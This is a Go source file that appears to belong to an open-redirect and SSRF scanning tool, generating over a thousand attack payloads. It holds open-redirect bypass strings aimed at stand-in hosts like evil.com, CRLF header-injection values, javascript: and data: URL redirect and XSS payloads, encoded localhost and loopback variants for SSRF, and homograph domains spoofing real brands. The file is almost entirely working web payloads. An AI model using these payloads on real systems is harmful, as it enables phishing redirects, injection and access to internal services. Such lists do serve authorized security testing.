package main

import (
	"fmt"
	"net/url"
	"strings"
)

type PayloadGenerator struct {
	baseURL string
}

func NewPayloadGenerator(baseURL string) *PayloadGenerator {
	return &PayloadGenerator{baseURL: baseURL}
}

func (pg *PayloadGenerator) Generate() []string {
	var payloads []string
	externalDomains := []string{
		"https://evil.com",
		"http://evil.net",
		"https://attacker.io",
		"http://malicious.org",
		"https://phishing.dev",
	}

	externalHosts := []string{
		"evil.com",
		"evil.net",
		"attacker.io",
	}

	schemes := []string{"http://", "https://"}
	protocolRelative := []string{"//", "///", "////", "//\\", "///\\"}
	backslash := []string{"\\/", "\\\\/", "/\\/", "\\\\\\/"}

	for _, d := range externalDomains {
		payloads = append(payloads, d)
	}

	for _, h := range externalHosts {
		payloads = append(payloads, h)
		for _, pr := range protocolRelative {
			payloads = append(payloads, pr+h)
		}
		for _, bs := range backslash {
			payloads = append(payloads, bs+h)
		}
		payloads = append(payloads, "http:"+h)
		payloads = append(payloads, "https:"+h)
		payloads = append(payloads, "HTTP://"+h)
		payloads = append(payloads, "HTTPS://"+h)
		payloads = append(payloads, "Http://"+h)
		payloads = append(payloads, "hTTP://"+h)
	}

	encodedVariants := []string{
		"%2f%2fevil.com", "%2F%2Fevil.com", "%2f%5cevil.com", "%2F%5Cevil.com",
		"%00//evil.com", "%00evil.com",
		"%0d%0aLocation:http://evil.com",
		"%0D%0ALocation:http://evil.com",
		"%09//evil.com", "%20//evil.com",
		"http://evil.com%40", "http://evil.com%2f@", "http://evil.com%5c@",
		"http://evil.com..", "http://evil.com/%2e%2e", "//evil.com%2e%2e",
	}
	payloads = append(payloads, encodedVariants...)

	for _, s := range schemes {
		for _, h := range externalHosts {
			payloads = append(payloads, s+h+"@"+extractHostSimple(pg.baseURL))
			payloads = append(payloads, s+h+"%00")
			payloads = append(payloads, s+h+"%23")
			payloads = append(payloads, s+h+"?")
			payloads = append(payloads, s+h+"#")
			payloads = append(payloads, s+h+"/..")
			payloads = append(payloads, s+h+"/../")
			payloads = append(payloads, s+h+"%2f..")
			payloads = append(payloads, s+h+"%2f../")
		}
	}

	dataPayloads := []string{
		"data:text/html,<script>location.href='http://evil.com'</script>",
		"data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbi5ocmVmPSdodHRwOi8vZXZpbC5jb20nPC9zY3JpcHQ+",
		"javascript:location.href='http://evil.com'",
		"javascript:alert(1)",
		"javascript:window.location='http://evil.com'",
		"vbscript:msgbox('XSS')",
	}
	payloads = append(payloads, dataPayloads...)

	unicodeVariants := []string{
		"http://evil.com/", "http://evil.com", "https://evil.com/", "https://evil.com",
		"http://évil.com", "http://xn--evil-cua.com",
	}
	payloads = append(payloads, unicodeVariants...)

	crlfVariants := []string{
		"http://evil.com%0aLocation:http://evil.com",
		"http://evil.com%0d%0aLocation:http://evil.com",
		"http://evil.com%0d%0a%0d%0a",
		"http://evil.com%0a%0d%0a",
	}
	payloads = append(payloads, crlfVariants...)

	obscured := []string{
		"http://evil.com:80", "https://evil.com:443", "http://evil.com:8080",
		"http://evil.com.", "http://evil.com..", "http://evil.com.%00", "http://evil.com%2e",
		"http://%65vil.com", "http://evil%2ecom", "http://evil%2ecom%2f",
		"//evil%2ecom", "http://127.0.0.1:8080/redirect?url=http://evil.com",
		"//127.0.0.1", "/\\127.0.0.1",
	}
	payloads = append(payloads, obscured...)

	payloads = uniqueStrings(payloads)
	return payloads
}

func extractHostSimple(rawURL string) string {
	if rawURL == "" {
		return "example.com"
	}
	u, err := url.Parse(rawURL)
	if err != nil || u.Host == "" {
		return rawURL
	}
	return u.Host
}

var ExternalDomains = []string{
	"evil.com", "evil.net", "evil.org", "evil.io", "evil.dev",
	"attacker.com", "attacker.io", "attacker.org", "attacker.net",
	"malicious.com", "malicious.org", "malicious.net", "malicious.dev",
	"phishing.com", "phishing.net", "phishing.org", "phishing.io", "phishing.dev",
	"hacker.com", "hacker.net", "hacker.org", "hacker.io",
	"xss.com", "xss.net", "xss.io", "xss.org",
	"redirect.com", "redirect.net", "redirect.org", "redirect.io",
	"pwned.com", "pwned.net", "0day.com", "0day.net",
	"exploit.com", "exploit.net", "exploit.org",
	"malware.com", "malware.net", "malware.org",
	"botnet.com", "botnet.org", "botnet.net",
	"c2.com", "c2-server.net",
	"darkweb.com", "darknet.com",
	"leak.com", "leak.net",
	"breach.com", "breach.net", "breach.org",
	"hacked.com", "hacked.org", "hacked.net",
	"cyberattack.com", "ransomware.com", "ransomware.net",
	"trojan.com", "worm.net", "rootkit.com", "backdoor.org", "backdoor.com",
	"keylogger.net", "spyware.com", "spyware.net",
	"phish.net", "phish.com",
	"ssrf.com", "ssrf.net",
	"callback.com", "callback.net",
	"webhook-test.com", "open-redirect.com",
	"requestbin.net", "collaborator.com",
	"burpcollab.com", "interactsh.com",
	"test-redirect.dev", "redirect-test.io",
}

var SchemeVariants = []string{
	"http://", "https://",
	"HTTP://", "HTTPS://",
	"hTTP://", "Http://",
	"hxxp://", "hxxps://",
}

var ProtocolRelativeVariants = []string{
	"//", "///", "////",
	"\\\\", "\\/", "/\\",
	"///\\", "//\\", "//\\\\",
}

var BypassSuffixes = []string{
	"", "@", ".", "..", "?@", "#@", "%00", "%23",
}

var PortVariants = []string{
	"", ":80", ":443", ":8080", ":8443", ":8888", ":8000", ":3000", ":5000", ":9000",
}

var PathTraversals = []string{
	"", "/", "/..", "/../", "/%2e%2e", "/%2f..", "/redirect", "/url",
	"/?", "/#", "/.env", "/.git",
}

func GenerateMassivePayloads() []string {
	var payloads []string

	schemes := SchemeVariants[:6]
	domains := ExternalDomains
	protorel := ProtocolRelativeVariants

	for _, s := range schemes {
		for _, d := range domains {
			payloads = append(payloads, s+d)
		}
	}

	for _, pr := range protorel {
		for _, d := range domains {
			payloads = append(payloads, pr+d)
		}
	}

	shortDomains := domains[:25]
	for _, s := range schemes[:4] {
		for _, d := range shortDomains {
			payloads = append(payloads, s+d+":80")
			payloads = append(payloads, s+d+":443")
			payloads = append(payloads, s+d+":8080")
			payloads = append(payloads, s+d+":8443")
		}
	}

	for _, s := range schemes[:4] {
		for _, d := range shortDomains {
			payloads = append(payloads, s+d+"@")
			payloads = append(payloads, s+d+".")
			payloads = append(payloads, s+d+"..")
			payloads = append(payloads, s+d+"%00")
			payloads = append(payloads, s+d+"?@")
			payloads = append(payloads, s+d+"/..")
			payloads = append(payloads, s+d+"/../")
		}
	}

	ipVariants := []string{
		"http://127.0.0.1", "http://127.0.0.1:80", "http://127.0.0.1:443",
		"http://127.0.0.1:8080", "http://127.0.0.1:8443",
		"http://0.0.0.0", "http://0.0.0.0:80", "http://0.0.0.0:8080",
		"http://localhost", "http://localhost:80", "http://localhost:443",
		"http://localhost:8080", "http://localhost:8443",
		"http://0x7f000001", "http://0x7f000001:80", "http://0x7f000001:8080",
		"http://2130706433", "http://2130706433:80",
		"http://0x0.0x0.0x0.0x1", "http://0x7f.0x0.0x0.0x1",
		"http://0177.0.0.1", "http://0177.0.0.1:80",
		"http://[::1]", "http://[::1]:80", "http://[::1]:443",
		"http://[::1]:8080", "http://[::ffff:127.0.0.1]",
		"http://0", "http://0:80",
		"http://127.1", "http://127.1:80",
		"http://127.0.1", "http://127.0.1:80",
		"//127.0.0.1", "///127.0.0.1", "////127.0.0.1",
		"//localhost", "///localhost", "////localhost",
		"\\\\localhost", "\\/localhost", "/\\localhost",
		"//0x7f000001", "//2130706433", "//[::1]",
		"http://0x0.0x0.0x0.0x0", "http://0x7f.0x0.0x0.0x0",
	}
	payloads = append(payloads, ipVariants...)

	encoded := []string{
		"http://%65vil.com", "http://evil%2ecom",
		"https://%65vil.com", "https://evil%2ecom",
		"HTTP://%45VIL.COM", "HTTPS://%45VIL.COM",
		"//%65vil.com", "///%65vil.com", "////%65vil.com",
		"%2f%2fevil.com", "%2F%2Fevil.com",
		"%2f%5cevil.com", "%2F%5Cevil.com",
		"%2f%2f%65vil.com", "%2F%2F%45VIL.COM",
		"%00//evil.com", "%00evil.com",
		"%00//%65vil.com",
		"%09//evil.com", "%09//%65vil.com",
		"%20//evil.com", "%20//%65vil.com",
		"http://evil.com%40", "http://evil.com%2f@",
		"http://evil.com%5c@", "http://evil.com%5c%40",
		"http://evil%2ecom%2f", "http://%65vil%2ecom",
		"//evil%2ecom", "//%65vil%2ecom",
		"http://evil.com%23", "http://evil.com%23test",
		"http://evil.com%3f", "http://evil.com%3ftest",
		"http://evil.com%3f@", "http://evil.com%23@",
		"%68%74%74%70%3a%2f%2fevil.com",
		"%68%74%74%70%73%3a%2f%2fevil.com",
		"%2f%2f%65%76%69%6c%2e%63%6f%6d",
	}
	payloads = append(payloads, encoded...)

	for _, d := range shortDomains[:15] {
		for _, e := range encoded[:10] {
			payloads = append(payloads, strings.Replace(e, "evil.com", d, -1))
		}
	}

	dataJs := []string{
		"javascript:location.href='http://evil.com'",
		"javascript:location.href='http://evil.net'",
		"javascript:location.href='https://attacker.io'",
		"javascript:location='http://evil.com'",
		"javascript:window.location='http://evil.com'",
		"javascript:window.location.href='http://evil.com'",
		"javascript:window.location.assign('http://evil.com')",
		"javascript:window.location.replace('http://evil.com')",
		"javascript:window.open('http://evil.com')",
		"javascript:document.location='http://evil.com'",
		"javascript:document.location.href='http://evil.com'",
		"javascript:document.url='http://evil.com'",
		"javascript:window.navigate('http://evil.com')",
		"javascript:location.replace('http://evil.com')",
		"javascript:location.assign('http://evil.com')",
		"javascript:this.location='http://evil.com'",
		"javascript:self.location='http://evil.com'",
		"javascript:top.location='http://evil.com'",
		"javascript:parent.location='http://evil.com'",
		"javascript:opener.location='http://evil.com'",
		"javascript:eval('location.href=\"http://evil.com\"')",
		"javascript:$.redirect('http://evil.com')",
		"javascript:window.location.href='//evil.com'",
		"javascript:window.location='//evil.com'",
		"data:text/html,<script>location.href='http://evil.com'</script>",
		"data:text/html,<meta http-equiv=refresh content='0;url=http://evil.com'>",
		"data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbi5ocmVmPSdodHRwOi8vZXZpbC5jb20nPC9zY3JpcHQ+",
		"data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHA6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=",
		"vbscript:window.location='http://evil.com'",
		"vbscript:location.href='http://evil.com'",
	}
	payloads = append(payloads, dataJs...)

	crlf := []string{
		"http://evil.com%0aLocation:http://evil.com",
		"http://evil.com%0d%0aLocation:http://evil.com",
		"http://evil.com%0d%0a%0d%0a",
		"http://evil.com%0a%0d%0a",
		"http://evil.com%0d%0aX-XSS-Protection:0",
		"http://evil.com%0d%0aContent-Length:0",
		"http://evil.com%0d%0a%0d%0a<script>alert(1)</script>",
		"http://evil.com%0d%0aSet-Cookie:test=1",
		"http://evil.net%0d%0aLocation:http://evil.com",
		"http://attacker.io%0d%0aLocation:http://attacker.io",
		"%0d%0aLocation:http://evil.com",
		"%0aLocation:http://evil.com",
		"%0d%0a%0d%0aLocation:http://evil.com",
	}
	payloads = append(payloads, crlf...)

	unicodeHomograph := []string{
		"http://еvil.com", "http://еvіl.com",
		"http://xn--vil-nea.com", "http://xn--evl-moa.com",
		"http://évil.com", "http://evil.cоm",
		"http://еvil.cоm", "http://xn--e-vil.com",
		"http://арре.com", "http://ѕсriрt.com",
		"http://раураl.com", "http://gооglе.com",
		"http://уоuЬе.com", "http://аmаzоn.com",
	}
	payloads = append(payloads, unicodeHomograph...)

	bypassAdvanced := []string{
		"http://evil.com%00@good.com",
		"http://evil.com%00.good.com",
		"http://evil.com@good.com",
		"http://evil.com.good.com",
		"http://evil.com%2e.good.com",
		"http://evil.com%23.good.com",
		"http://evil.com%3f.good.com",
		"http://evil.com/..;/",
		"http://evil.com/..%3b/",
		"http://evil.com;/",
		"http://evil.com%3b/",
		"http://evil.com..;/",
		"http://evil.com/..%00/",
		"http://evil.com%2f..%2f",
		"http://evil.com%2f..%2fgood.com",
		"http://evil.com%5c..%5c",
		"http://evil.com%5c..%5cgood.com",
		"//evil.com@good.com",
		"//evil.com%00@good.com",
		"//evil.com.good.com",
		"//evil.com%2e.good.com",
		"///evil.com///good.com",
		"https://evil.com@good.com:443",
		"http://evil.com:80@good.com:80",
		"http://evil.com%3a80@good.com",
		"http://evil.com%3a80%00@good.com",
		"http://evil.com..%00@good.com",
		"http://evil.com:@good.com",
		"http://evil.com:80@good.com",
		"http://evil.com#@good.com",
		"http://evil.com/?@good.com",
		"http://evil.com%3f@good.com",
		"http://evil.com%23@good.com",
		"http://evil.com%0a@good.com",
		"http://evil.com%0d%0a@good.com",
		"http://evil.com%00",
		"http://evil.com%00/",
		"http://evil.com%00.com",
		"http://evil.com%00.good.com",
	}
	payloads = append(payloads, bypassAdvanced...)

	for _, d := range ExternalDomains[:10] {
		payloads = append(payloads, fmt.Sprintf("http://%s/", d))
		payloads = append(payloads, fmt.Sprintf("https://%s/", d))
		payloads = append(payloads, fmt.Sprintf("http://%s/?", d))
		payloads = append(payloads, fmt.Sprintf("http://%s/#", d))
		payloads = append(payloads, fmt.Sprintf("//%s/", d))
		payloads = append(payloads, fmt.Sprintf("http://%s:9999", d))
		payloads = append(payloads, fmt.Sprintf("http://%s:666", d))
		payloads = append(payloads, fmt.Sprintf("http://%s/redirect?url=http://evil.com", d))
	}

	for _, d := range ExternalDomains[:8] {
		for _, c := range []string{"http://", "https://", "//"} {
			payloads = append(payloads, fmt.Sprintf("%s%s/..", c, d))
			payloads = append(payloads, fmt.Sprintf("%s%s/../", c, d))
			payloads = append(payloads, fmt.Sprintf("%s%s/%2e%2e", c, d))
			payloads = append(payloads, fmt.Sprintf("%s%s/%2e%2e/", c, d))
		}
	}

	for _, d := range ExternalDomains[:5] {
		for _, c := range []string{"http://", "https://"} {
			for _, p := range []string{":80", ":443", ":8080", ":8443"} {
				payloads = append(payloads, fmt.Sprintf("%s%s%s/..", c, d, p))
				payloads = append(payloads, fmt.Sprintf("%s%s%s", c, d, p))
			}
		}
	}

	for _, d := range ExternalDomains[:5] {
		payloads = append(payloads, fmt.Sprintf("http://%s@localhost", d))
		payloads = append(payloads, fmt.Sprintf("http://%s@127.0.0.1", d))
		payloads = append(payloads, fmt.Sprintf("http://%s@[::1]", d))
		payloads = append(payloads, fmt.Sprintf("https://%s@localhost", d))
		payloads = append(payloads, fmt.Sprintf("https://%s@127.0.0.1", d))
		payloads = append(payloads, fmt.Sprintf("//%s@localhost", d))
		payloads = append(payloads, fmt.Sprintf("//%s@127.0.0.1", d))
	}

	fragmentSuffixes := []string{
		"#", "#!", "#/", "#/redirect",
		"?", "??", "?x=", "?test=1",
	}
	for _, d := range ExternalDomains[:8] {
		for _, f := range fragmentSuffixes {
			payloads = append(payloads, "http://"+d+f)
			payloads = append(payloads, "https://"+d+f)
		}
	}

	payloads = uniqueStrings(payloads)
	return payloads
}

var DomainPayloads = []string{
	"https://evil.com", "http://evil.net", "https://attacker.io", "http://malicious.org",
	"https://phishing.dev", "//evil.com", "//evil.net", "///evil.com", "////evil.com",
	"\\\\evil.com", "\\/evil.com", "/\\evil.com",
	"http://evil.com", "https://evil.com",
	"http:evil.com", "https:evil.com",
	"HTTP://evil.com", "HTTPS://evil.com",
	"Http://evil.com", "hTTP://evil.com",
	"evil.com", "evil.net", "attacker.io",
	"http://evil.com/", "https://evil.com/",
	"http://evil.com/?", "https://evil.com/?",
	"http://evil.com/#", "https://evil.com/#",
	"http://evil.com?@", "https://evil.com?@",
	"http://evil.com#@", "https://evil.com#@",
}

var ProtocolRelativePayloads = []string{
	"//evil.com", "///evil.com", "////evil.com",
	"//\\evil.com", "///\\evil.com",
	"//evil.com/", "//evil.com/%2e%2e", "//evil.com/%2f..",
	"//evil.com/..", "//evil.com/../",
	"//evil.com?", "//evil.com#",
	"//evil.com:80", "//evil.com:443", "//evil.com:8080",
	"\\\\evil.com", "\\/evil.com", "/\\evil.com", "\\\\\\evil.com",
	"//127.0.0.1", "//localhost",
}

var EncodedPayloads = []string{
	"%2f%2fevil.com", "%2F%2Fevil.com",
	"%2f%5cevil.com", "%2F%5Cevil.com",
	"%00//evil.com", "%00evil.com",
	"%0d%0aLocation:http://evil.com", "%0D%0ALocation:http://evil.com",
	"%09//evil.com", "%20//evil.com",
	"http://evil.com%40", "http://evil.com%2f@", "http://evil.com%5c@",
	"http://evil.com..", "http://evil.com/%2e%2e",
	"//evil.com%2e%2e",
	"http://evil%2ecom", "http://%65vil.com",
	"http://evil%2ecom%2f", "//evil%2ecom",
	"//127.0.0.1",
	"http://evil.com%23", "http://evil.com%3f",
	"http://evil.com%3f@", "http://evil.com%23@",
	"%2f%2f%65vil.com", "http://%65vil%2ecom",
	"http://evil.com%00", "http://evil.com%00test",
}

var DataPayloads = []string{
	"data:text/html,<script>location.href='http://evil.com'</script>",
	"data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbi5ocmVmPSdodHRwOi8vZXZpbC5jb20nPC9zY3JpcHQ+",
	"data:text/html,<meta http-equiv=refresh content='0;url=http://evil.com'>",
	"data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHA6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=",
	"javascript:location.href='http://evil.com'",
	"javascript:window.location='http://evil.com'",
	"javascript:window.open('http://evil.com')",
	"javascript:document.location='http://evil.com'",
	"javascript:document.url='http://evil.com'",
	"javascript:location='http://evil.com'",
	"javascript:window.location.assign('http://evil.com')",
	"javascript:window.location.replace('http://evil.com')",
	"javascript:window.navigate('http://evil.com')",
	"javascript:self.location='http://evil.com'",
	"javascript:top.location='http://evil.com'",
	"javascript:parent.location='http://evil.com'",
	"javascript:$.redirect('http://evil.com')",
	"javascript:document.location.href='http://evil.com'",
	"vbscript:window.location='http://evil.com'",
	"vbscript:location.href='http://evil.com'",
	"javascript:location.href='//evil.com'",
	"javascript:window.location='//evil.com'",
	"javascript:window.location.href='//evil.com'",
}

var BypassPayloads = []string{
	"http://evil.com:80", "https://evil.com:443",
	"http://evil.com:8080", "http://evil.com:8443",
	"http://evil.com.", "http://evil.com..",
	"http://evil.com.%00", "http://evil.com%2e",
	"http://127.0.0.1", "http://0x7f000001",
	"http://2130706433",
	"http://0x0.0x0.0x0.0x1", "http://0x7f.0x0.0x0.0x1",
	"http://[::1]", "http://[::1]:80", "http://[::1]:443",
	"http://localhost", "http://localhost:80",
	"//localhost", "///localhost", "////localhost",
	"/\\localhost", "\\\\localhost",
	"//127.0.0.1", "///127.0.0.1", "////127.0.0.1",
	"/\\127.0.0.1",
	"http://evil.com?", "http://evil.com#",
	"http://evil.com/?", "http://evil.com/#",
	"http://evil.com%23", "http://evil.com%23@",
	"http://evil.com%3f", "http://evil.com%3f@",
	"http://evil.com@", "http://evil.com@localhost",
	"http://evil.com@127.0.0.1", "http://evil.com@[::1]",
	"http://evil.com%00@", "http://evil.com%00.good.com",
	"http://evil.com.good.com", "http://evil.com%2e.good.com",
	"http://evil.com/..;/", "http://evil.com/..%00/",
	"http://evil.com;/", "http://evil.com%3b/",
	"//evil.com@127.0.0.1", "//evil.com%00@127.0.0.1",
	"http://0177.0.0.1", "http://0",
	"http://127.1", "http://127.0.1",
	"http://0x0.0x0.0x0.0x0",
	"http://evil.com:80@127.0.0.1:80",
	"http://evil.com%3a80@127.0.0.1",
	"http://evil.com:@127.0.0.1",
	"http://evil.com#@127.0.0.1",
}

var PathPayloads = []string{
	"//evil.com", "///evil.com", "////evil.com",
	"/\\evil.com", "\\\\evil.com",
	"http://evil.com", "https://evil.com",
	"/http://evil.com", "//http://evil.com", "///http://evil.com",
	"https://evil.com/",
	"//evil.com/", "//evil.com/..", "//evil.com/../",
	"//evil.com/%2e%2e", "//evil.com/%2f..",
	"//127.0.0.1", "//localhost",
	"http://evil.com?@", "http://evil.com#@",
}

var HeaderPayloads = []string{
	"http://evil.com", "https://evil.com",
	"//evil.com", "///evil.com", "////evil.com",
	"http://evil.net", "https://attacker.io",
	"\\\\evil.com", "\\/evil.com", "/\\evil.com",
	"http://127.0.0.1", "http://localhost",
	"//127.0.0.1", "//localhost",
	"http://evil.com/", "https://evil.com/",
	"http://evil.com:80", "http://evil.com:8080",
	"http://evil.com?@", "http://evil.com#@",
}

var BlindPayloads = []string{
	"http://evil.com", "https://evil.com",
	"//evil.com", "///evil.com", "////evil.com",
	"http://evil.com/", "https://evil.com/",
	"//evil.com/", "///evil.com/",
	"http://evil.net", "http://attacker.io",
	"http://malicious.org", "https://phishing.dev",
	"http://hacker.com", "//hacker.com",
	"http://xss.com", "//xss.com",
	"http://callback.com", "http://webhook-test.com",
	"http://requestbin.net", "http://collaborator.com",
	"http://burpcollab.com", "http://interactsh.com",
	"https://callback.com", "https://webhook-test.com",
	"https://requestbin.net", "https://collaborator.com",
}

func uniqueStrings(s []string) []string {
	seen := make(map[string]struct{})
	result := make([]string, 0)
	for _, v := range s {
		if _, ok := seen[v]; !ok {
			seen[v] = struct{}{}
			result = append(result, v)
		}
	}
	return result
}

func init() {
	if len(GenerateMassivePayloads()) < 1000 {
		fmt.Println("  [!] Warning: Less than 1000 payloads generated")
	}
}
